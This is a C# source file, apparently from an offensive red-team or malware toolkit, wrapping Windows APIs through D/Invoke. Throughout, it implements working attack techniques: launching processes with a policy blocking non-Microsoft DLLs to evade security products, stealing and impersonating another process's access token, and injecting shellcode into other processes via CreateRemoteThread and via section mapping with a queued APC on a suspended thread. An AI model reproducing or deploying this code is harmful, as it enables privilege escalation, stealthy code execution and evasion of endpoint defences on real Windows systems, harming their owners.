using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using DInvoke;

namespace WinAPI.Wrapper
{
    public class DInvokeAPIWrapper : WinAPIWrapper
    {
        internal DInvokeAPIWrapper()
        {

        }

        public override ProcessCreationResult CreateProcess(ProcessCreationParameters parms)
        {
            var startupInfoEx = new Kernel32.STARTUPINFOEX();
            startupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfoEx);
            var pInfo = new Kernel32.PROCESS_INFORMATION();
            var outPipe_w = IntPtr.Zero;
            Kernel32.PROCESS_CREATION_FLAGS creationFlags = 0;

            var result = new ProcessCreationResult();
            try
            {

                _ = Kernel32.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 1);

                const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
                const int MITIGATION_POLICY = 0x20007;

                var blockDllPtr = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(blockDllPtr, new IntPtr(BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));

                _ = Kernel32.UpdateProcThreadAttribute(
                    ref startupInfoEx.lpAttributeList,
                    (IntPtr)MITIGATION_POLICY,
                    ref blockDllPtr);


                if (parms.RedirectOutput)
                {
                    const uint USE_STD_HANDLES = 0x00000100;

                    Kernel32.SECURITY_ATTRIBUTES saAttr = new Kernel32.SECURITY_ATTRIBUTES();
                    saAttr.bInheritHandle = true;
                    saAttr.lpSecurityDescriptor = IntPtr.Zero;

                    Kernel32.CreatePipe(out var outPipe_rd, out outPipe_w, ref saAttr);

                    // Ensure the read handle to the pipe for STDOUT is not inherited.
                    Kernel32.SetHandleInformation(outPipe_rd, Kernel32.HANDLE_FLAGS.INHERIT, 0);


                    startupInfoEx.StartupInfo.hStdError = outPipe_w;
                    startupInfoEx.StartupInfo.hStdOutput = outPipe_w;
                    //sInfoEx.StartupInfo.hStdInput = inPipe_rd;

                    result.OutPipeHandle = outPipe_rd;

                    startupInfoEx.StartupInfo.dwFlags |= USE_STD_HANDLES;
                }


                if (parms.CreateSuspended)
                    creationFlags |= Kernel32.PROCESS_CREATION_FLAGS.CREATE_SUSPENDED;

                if (parms.CreateNoWindow)
                    creationFlags |= Kernel32.PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW;


                if (parms.Token != IntPtr.Zero)
                {

                    if (!Advapi.CreateProcessWithTokenW(parms.Token, Advapi.LogonFlags.LogonWithProfile, parms.Application, parms.Command, creationFlags, IntPtr.Zero, parms.CurrentDirectory, ref startupInfoEx, out pInfo))
                        throw new InvalidOperationException($"Error in CreateProcessWithTokenW : {Marshal.GetLastWin32Error()}");
                }
                else
                {
                    creationFlags |= Kernel32.PROCESS_CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT;
                    if (!Kernel32.CreateProcessW(parms.Application, parms.Command, (uint)creationFlags, parms.CurrentDirectory, ref startupInfoEx, out pInfo, parms.RedirectOutput))
                        throw new InvalidOperationException($"Error in CreateProcessW : {Marshal.GetLastWin32Error()}");
                }

                result.ProcessHandle = pInfo.hProcess;
                result.ThreadHandle = pInfo.hThread;
                result.ProcessId = pInfo.dwProcessId;

            }
            finally
            {
                // Free the attribute list
                if (startupInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    Kernel32.DeleteProcThreadAttributeList(ref startupInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
                }
                //Marshal.FreeHGlobal(lpValue);
                Kernel32.CloseHandle(outPipe_w);
            }
            return result;
        }

        public override IntPtr StealToken(int processId)
        {
            var process = Process.GetProcessById(processId);

            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;

            try
            {
                //open handle to token
                if (!Advapi.OpenProcessToken(process.Handle, Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                    throw new InvalidOperationException($"Failed to open process token");


                //duplicate  token
                var sa = new Kernel32.SECURITY_ATTRIBUTES();
                if (!Advapi.DuplicateTokenEx(hToken, Advapi.TokenAccess.TOKEN_ALL_ACCESS, ref sa, Advapi.SecurityImpersonationLevel.SECURITY_IMPERSONATION, Advapi.TokenType.TOKEN_IMPERSONATION, out hTokenDup))
                {
                    Kernel32.CloseHandle(hToken);
                    process.Dispose();
                    throw new InvalidOperationException($"Failed to duplicate token");
                }

                //impersonate Token
                if (!Advapi.ImpersonateLoggedOnUser(hTokenDup))
                    throw new InvalidOperationException($"Failed to impersonate token");

                //var identity = new WindowsIdentity(hTokenDup);
                return hTokenDup;
            }
            finally
            {
                if (hToken != IntPtr.Zero)
                    Kernel32.CloseHandle(hToken);
                process.Dispose();
            }
        }

        public override byte[] ReadFromPipe(IntPtr pipe, uint buffSize = 1024)
        {
            if (!Kernel32.ReadFile(pipe, out var buff, buffSize))
                throw new InvalidOperationException($"Failed reading pipe : {Marshal.GetLastWin32Error()}");
            return buff;
        }

        public override void InjectCreateRemoteThread(IntPtr processHandle,IntPtr threadHandle, byte[] shellcode)
        {
            var baseAddress = Kernel32.VirtualAllocEx(
                processHandle,
                IntPtr.Zero,
                shellcode.Length,
                Kernel32.AllocationType.Commit |  Kernel32.AllocationType.Reserve,
                Kernel32.MemoryProtection.ReadWrite);

            if (baseAddress == IntPtr.Zero)
                throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");


            IntPtr bytesWritten = IntPtr.Zero;
            if (!Kernel32.WriteProcessMemory(processHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
                throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");

            if (bytesWritten.ToInt32() != shellcode.Length)
                throw new InvalidOperationException($"Failed to write All the shellcode into the process");

            if (!Kernel32.VirtualProtectEx(
                processHandle,
                baseAddress,
                shellcode.Length,
                Kernel32.MemoryProtection.ExecuteRead,
                out _))
            {
                throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
            }

            IntPtr threadres = IntPtr.Zero;

            IntPtr thread = Kernel32.CreateRemoteThread(processHandle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);

            if (thread == IntPtr.Zero)
                throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
        }

        public override void InjectProcessHollowingWithAPC(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode)
        {
            const uint GENERIC_ALL = 0x10000000;
            const uint PAGE_EXECUTE_READWRITE = 0x40;
            const uint SEC_COMMIT = 0x08000000;

            var hLocalSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            var status = Native.NtCreateSection(
                ref hLocalSection,
                GENERIC_ALL,
                IntPtr.Zero,
                ref maxSize,
                PAGE_EXECUTE_READWRITE,
                SEC_COMMIT,
                IntPtr.Zero);

            const uint PAGE_READWRITE = 0x04;

            var self = System.Diagnostics.Process.GetCurrentProcess();
            var hLocalBaseAddress = IntPtr.Zero;

            status = Native.NtMapViewOfSection(
                hLocalSection,
                self.Handle,
                ref hLocalBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_READWRITE);

            const uint PAGE_EXECUTE_READ = 0x20;

            var hRemoteBaseAddress = IntPtr.Zero;

            status = Native.NtMapViewOfSection(
                hLocalSection,
                processHandle,
                ref hRemoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                ref maxSize,
                2,
                0,
                PAGE_EXECUTE_READ);

            Marshal.Copy(shellcode, 0, hLocalBaseAddress, shellcode.Length);

            var res = Native.NtQueueApcThread(
            threadHandle,
            hRemoteBaseAddress,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero);

            _ = Native.NtResumeThread(threadHandle);
        }
    }
}
